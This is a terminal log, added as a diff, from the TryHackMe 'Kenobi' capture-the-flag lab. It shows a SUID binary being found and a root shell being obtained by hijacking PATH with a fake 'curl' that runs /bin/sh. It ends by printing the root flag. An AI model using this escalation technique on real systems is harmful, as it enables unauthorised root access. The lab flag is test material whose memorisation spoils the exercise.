@@ -1,0 +1,160 @@
+┌──(kali㉿kali)-[~/GitHub/TryHackMe/Kenobi]                    
+└─$ ssh -i id_rsa kenobi@10.10.57.242                          
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)                                                             
+
+ * Documentation:  https://help.ubuntu.com                     
+ * Management:     https://landscape.canonical.com             
+ * Support:        https://ubuntu.com/advantage                
+
+103 packages can be updated.                                   
+65 updates are security updates.                               
+
+
+Last login: Mon Jul 19 18:55:17 2021 from 10.6.85.73           
+To run a command as administrator (user "root"), use "sudo <command>".                                                        
+See "man sudo_root" for details.                               
+
+kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null         
+/sbin/mount.nfs                                                
+/usr/lib/policykit-1/polkit-agent-helper-1                     
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper                    
+/usr/lib/snapd/snap-confine                                    
+/usr/lib/eject/dmcrypt-get-device                              
+/usr/lib/openssh/ssh-keysign                                   
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic                     
+/usr/bin/chfn                                                  
+/usr/bin/newgidmap                                             
+/usr/bin/pkexec                                                
+/usr/bin/passwd                                                
+/usr/bin/newuidmap                                             
+/usr/bin/gpasswd                                               
+/usr/bin/menu                                                  
+/usr/bin/sudo                                                  
+/usr/bin/chsh                                                  
+/usr/bin/at                                                    
+/usr/bin/newgrp                                                
+/bin/umount                                                    
+/bin/fusermount                                                
+/bin/mount                                                     
+/bin/ping                                                      
+/bin/su                                                        
+/bin/ping6                                                     
+kenobi@kenobi:~$ /usr/bin/menu                                 
+
+***************************************                        
+1. status check                                                
+2. kernel version                                              
+3. ifconfig                                                    
+** Enter your choice :^C                                       
+kenobi@kenobi:~$ strings /usr/bin/menu                         
+/lib64/ld-linux-x86-64.so.2                                    
+libc.so.6                                                      
+setuid                                                         
+__isoc99_scanf                                                 
+puts                                                           
+__stack_chk_fail                                               
+printf                                                         
+system                                                         
+__libc_start_main                                              
+__gmon_start__                                                 
+GLIBC_2.7                                                      
+GLIBC_2.4                                                      
+GLIBC_2.2.5                                                    
+UH-`                                                           
+AWAVA                                                          
+AUATL                                                          
+[]A\A]A^A_                                                     
+***************************************                        
+1. status check                                                
+2. kernel version                                              
+3. ifconfig                                                    
+** Enter your choice :                                         
+curl -I localhost                                              
+uname -r                                                       
+ifconfig                                                       
+ Invalid choice                                                
+;*3$"                                                          
+GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609           
+crtstuff.c                                                     
+__JCR_LIST__                                                   
+deregister_tm_clones                                           
+__do_global_dtors_aux                                          
+completed.7594                                                 
+__do_global_dtors_aux_fini_array_entry                         
+frame_dummy                                                    
+__frame_dummy_init_array_entry                                 
+menu.c                                                         
+__FRAME_END__                                                  
+__JCR_END__                                                    
+__init_array_end                                               
+_DYNAMIC                                                       
+__init_array_start                                             
+__GNU_EH_FRAME_HDR                                             
+_GLOBAL_OFFSET_TABLE_                                          
+__libc_csu_fini                                                
+_ITM_deregisterTMCloneTable                                    
+puts@@GLIBC_2.2.5                                              
+_edata                                                         
+__stack_chk_fail@@GLIBC_2.4                                    
+system@@GLIBC_2.2.5                                            
+printf@@GLIBC_2.2.5                                            
+__libc_start_main@@GLIBC_2.2.5                                 
+__data_start                                                   
+__gmon_start__                                                 
+__dso_handle                                                   
+_IO_stdin_used                                                 
+__libc_csu_init                                                
+__bss_start                                                    
+main                                                           
+_Jv_RegisterClasses                                            
+__isoc99_scanf@@GLIBC_2.7                                      
+__TMC_END__                                                    
+_ITM_registerTMCloneTable                                      
+setuid@@GLIBC_2.2.5                                            
+.symtab                                                        
+.strtab                                                        
+.shstrtab                                                      
+.interp                                                        
+.note.ABI-tag                                                  
+.note.gnu.build-id                                             
+.gnu.hash                                                      
+.dynsym                                                        
+.dynstr                                                        
+.gnu.version                                                   
+.gnu.version_r                                                 
+.rela.dyn                                                      
+.rela.plt                                                      
+.init                                                          
+.plt.got                                                       
+.text                                                          
+.fini                                                          
+.rodata                                                        
+.eh_frame_hdr                                                  
+.eh_frame                                                      
+.init_array                                                    
+.fini_array                                                    
+.jcr                                                           
+.dynamic                                                       
+.got.plt                                                       
+.data                                                          
+.bss                                                           
+.comment                                                       
+kenobi@kenobi:~$ echo /bin/sh > curl                           
+kenobi@kenobi:~$ chmod 777 curl                                
+kenobi@kenobi:~$ mv curl /tmp                                  
+kenobi@kenobi:~$ cd /tmp                                       
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH                     
+kenobi@kenobi:/tmp$ /usr/bin/menu                              
+
+***************************************                        
+1. status check                                                
+2. kernel version                                              
+3. ifconfig                                                    
+** Enter your choice :1                                        
+# whoami                                                       
+root                                                           
+# cat /usr/root.txt                                            
+cat: /usr/root.txt: No such file or directory                  
+# cat /root/root.txt                                           
+177b3cd8562289f37382721c28381f02                               
+#                                                              
